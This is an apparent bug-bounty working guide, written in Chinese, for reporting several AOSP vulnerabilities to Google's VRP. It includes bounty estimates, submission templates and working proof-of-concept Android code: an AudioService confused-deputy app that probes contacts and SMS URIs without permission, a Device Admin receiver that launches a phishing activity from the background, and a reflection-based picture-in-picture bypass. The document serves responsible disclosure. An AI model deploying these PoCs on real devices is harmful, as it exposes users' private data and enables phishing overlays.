# AOSP Variant PoC & Exploitation Guide

> Google VRP 标准评估 + 完整 PoC 操作指南
> 2026-04-28

---

## Google VRP 评级标准

| 维度 | 高分 | 低分 |
|------|------|------|
| Attack Vector | Remote / 0-click | Local + 需多步交互 |
| User Interaction | None | 需要用户主动操作 |
| Scope | Changed (影响其他组件) | Unchanged |
| Impact | C+I+A 全部 | 仅 ID 或 DoS |
| Privileges Required | None | High |
| Exploit Complexity | Low | High |

**关键**: Google 特别看重 working PoC (赏金翻倍), Pixel 设备验证, exploit chain 价值。

---

## V-3: AudioService URI Confused Deputy (最推荐首提)

### VRP 评估: CVSS 7.1 (High) | $5k-$10k + $3k PoC bonus

| 维度 | 评估 |
|------|------|
| Privileges Required | **None** (无需任何 permission) |
| User Interaction | **None** (安装后自动触发) |
| Scope | **Changed** (影响其他 app 的 ContentProvider) |

### PoC App

**AndroidManifest.xml** — 不需要任何 permission:
```xml
<manifest package="com.poc.audioserviceconfuseddeputy">
    <application android:label="AudioServicePoC">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**MainActivity.java**:
```java
package com.poc.audioserviceconfuseddeputy;

import android.app.Activity;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {
    private static final String TAG = "AudioServicePoC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        testConfusedDeputy();
    }

    private void testConfusedDeputy() {
        AudioManager am = getSystemService(AudioManager.class);
        
        // Case 1: 访问 Contacts Provider (需 READ_CONTACTS 权限 — 我们没有)
        Uri contactsUri = Uri.parse("content://com.android.contacts/contacts/1/photo");
        try {
            boolean result = am.hasHapticChannels(contactsUri);
            Log.d(TAG, "[VULN] Accessed contacts without permission! Result: " + result);
        } catch (SecurityException e) {
            Log.d(TAG, "[SAFE] Blocked: " + e.getMessage());
        } catch (Exception e) {
            // 非 SecurityException = URI 已被系统打开
            Log.d(TAG, "[VULN] System opened URI (non-security exception): " + e.getClass());
        }

        // Case 2: SMS Provider (需 READ_SMS)
        Uri smsUri = Uri.parse("content://sms/inbox/1");
        try {
            boolean result = am.hasHapticChannels(smsUri);
            Log.d(TAG, "[VULN] Accessed SMS without READ_SMS! Result: " + result);
        } catch (Exception e) {
            Log.d(TAG, "SMS: " + e.getClass().getName());
        }

        // Case 3: Timing oracle — URI 存在性探测
        long start, end;
        Uri existing = Uri.parse("content://media/external/audio/media/1");
        Uri nonExisting = Uri.parse("content://media/external/audio/media/99999999");
        
        start = System.nanoTime();
        try { am.hasHapticChannels(existing); } catch (Exception ignored) {}
        end = System.nanoTime();
        long t1 = end - start;

        start = System.nanoTime();
        try { am.hasHapticChannels(nonExisting); } catch (Exception ignored) {}
        end = System.nanoTime();
        long t2 = end - start;

        Log.d(TAG, "Timing: existing=" + t1/1000 + "us, non-existing=" + t2/1000 + "us");
    }
}
```

### 验证步骤
```bash
adb install -r app-debug.apk
adb logcat -s AudioServicePoC:D
# 预期: [VULN] 开头的日志

# Frida 辅助验证 (监控 Provider 被系统调用):
frida -U -f com.android.providers.contacts -l monitor_open.js
```

### 提交模板
```
Title: AudioService.hasHapticChannels() confused deputy - arbitrary URI access as SYSTEM_UID

Severity: High (EoP / ID)
Affected: Android 13, 14, 15 (all with AudioService.hasHapticChannels)
Tested on: Pixel 8, Android 15, 2025-12-05 patch level

Root cause: services/core/java/com/android/server/audio/AudioService.java:8493
  No checkUriPermission() before MediaExtractor.setDataSource(mContext, uri)

Suggested fix: Add checkUriPermission() matching CVE-2025-22420 pattern.
```

---

## V-2: DevicePolicyManagerService BAL Propagation

### VRP 评估: CVSS 7.1 (High) | $7.5k-$15k

### PoC App

**device_admin_policies.xml**:
```xml
<device-admin>
    <uses-policies>
        <watch-login/>
    </uses-policies>
</device-admin>
```

**PocDeviceAdmin.java**:
```java
public class PocDeviceAdmin extends DeviceAdminReceiver {
    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        // 此时已从 BroadcastOptions 继承 BAL 权限
        Intent phishing = new Intent(context, PhishingActivity.class);
        phishing.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            context.startActivity(phishing);
            Log.d("PoC", "[VULN] Background activity launched via admin BAL!");
        } catch (Exception e) {
            Log.d("PoC", "[BLOCKED] " + e.getMessage());
        }
    }
}
```

### 验证步骤
```bash
# 1. 安装并激活 Device Admin
adb install -r app-debug.apk
adb shell am start -n com.poc.adminbal/.MainActivity
# 用户确认激活

# 2. 触发 (故意输错锁屏密码)
# 或 adb shell input text "wrong" && adb shell input keyevent KEYCODE_ENTER

# 3. 观察
adb logcat -s PoC:D
# 预期: [VULN] Background activity launched
```

---

## V-1: isLaunchIntoPip() PiP Overlay Bypass

### VRP 评估: CVSS 7.7 (High) | $5k-$10k

### PoC 核心代码
```java
// 通过反射或 Bundle 构造
ActivityOptions options = ActivityOptions.makeBasic();
PictureInPictureParams pipParams = new PictureInPictureParams.Builder()
        .setAspectRatio(new Rational(3, 4))
        .build();

// 方法 1: 反射
Method setMethod = ActivityOptions.class.getDeclaredMethod(
    "setLaunchIntoPipParams", PictureInPictureParams.class);
setMethod.setAccessible(true);
setMethod.invoke(options, pipParams);
startActivity(intent, options.toBundle());

// 方法 2: 直接构造 Bundle
Bundle bundle = new Bundle();
bundle.putParcelable("android.activity.launchIntoPipParams", pipParams);
startActivity(intent, bundle);
```

### 提交要点
强调这是 **CVE-2025-48546 的 incomplete fix / bypass** — 同一效果，不同代码路径。

---

## V-8: PackageArchiver Intent 转发

### VRP 评估: CVSS 8.4 (High→Critical) | $10k-$20k

### 利用思路
```
1. 攻击者 App 调用 PackageInstaller API 触发 unarchive 流程
2. 系统创建 UnarchiveIntentSender
3. 攻击者控制 fillIn Intent 的 EXTRA_INTENT
4. EXTRA_INTENT 指向非导出的 Settings Activity
5. 系统以 SYSTEM_UID 启动 → 绕过导出限制
```

### 需要研究的点
- `requestUnarchive()` 的调用链如何让攻击者控制 fillIn
- 是否需要先 archive 一个 app (可能需要 Device Owner)
- `preventIntentRedirect` token 是否在此路径生效

### Frida 验证脚本
```javascript
Java.perform(function() {
    var PackageArchiver = Java.use("com.android.server.pm.PackageArchiver$UnarchiveIntentSender");
    PackageArchiver.send.implementation = function(code, intent, resolvedType, 
            whitelistToken, finishedReceiver, requiredPermission, options) {
        console.log("[UnarchiveIntentSender.send] triggered!");
        console.log("  Intent: " + intent);
        if (intent) {
            var extra = intent.getParcelableExtra("android.intent.extra.INTENT");
            console.log("  EXTRA_INTENT: " + extra);
        }
        return this.send(code, intent, resolvedType, whitelistToken, 
            finishedReceiver, requiredPermission, options);
    };
});
```

---

## 提交策略

### 推荐顺序

| # | 漏洞 | 理由 |
|---|------|------|
| 1 | V-3 AudioService | 最干净: 5分钟写完 PoC, 零权限, 必收 |
| 2 | V-8 PackageArchiver | 最高赏金, 但需要更多研究确认利用链 |
| 3 | V-2 DPMS BAL | 赏金高, PoC 明确, 需 Device Admin 前置 |
| 4 | V-1 PiP bypass | CVE bypass 类型, 容易被接受 |
| 5 | V-10 RingtonePlayer | 确认 IRingtonePlayer 可获取后提交 |

### 提交地址
**Google Bug Hunters**: https://bughunters.google.com/report/vrp → Android → AOSP

### 注意事项
- 分别提交，每个独立 bug
- 附带编译好的 PoC APK
- 标明 "Tested on Pixel X, Android 15, YYYY-MM-DD patch level"
- 引用关联 CVE commit hash
- 建议修复代码

---

*Guide generated: 2026-04-28*
